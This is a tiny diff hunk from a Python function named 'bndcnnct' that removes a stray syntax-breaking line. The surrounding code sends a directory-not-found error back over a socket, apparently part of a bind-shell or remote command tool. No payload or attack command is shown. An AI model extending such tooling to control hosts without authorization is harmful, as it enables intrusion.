@@ -88,7 +88,6 @@ def bndcnnct(port):
                 pass
             except IOError as a :
                 ioerror=str.encode("[-] Directory Not Found")
-")
                 a.send(ioerror)
                 pass
             
